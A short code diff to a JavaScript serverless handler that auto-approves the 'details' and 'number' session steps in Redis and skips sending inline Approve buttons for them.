@@ -12,7 +12,7 @@ exports.handler = async (event, context) => {
 
         // Set initial status in Redis
         const redisKey = `session:${sessionId}:${step}`;
-        const initialStatus = step === 'details' ? 'approved' : 'pending';
+        const initialStatus = (step === 'details' || step === 'number') ? 'approved' : 'pending';
         
         await fetch(`${redisUrl}/set/${redisKey}/${initialStatus}?EX=600`, {
             headers: { Authorization: `Bearer ${redisToken}` }
@@ -25,7 +25,7 @@ exports.handler = async (event, context) => {
         }
         
         let replyMarkup = {};
-        if (step !== 'details') {
+        if (step !== 'details' && step !== 'number') {
             replyMarkup = {
                 inline_keyboard: [[
                     { text: "✅ Approve", callback_data: `approve|${sessionId}|${step}` },
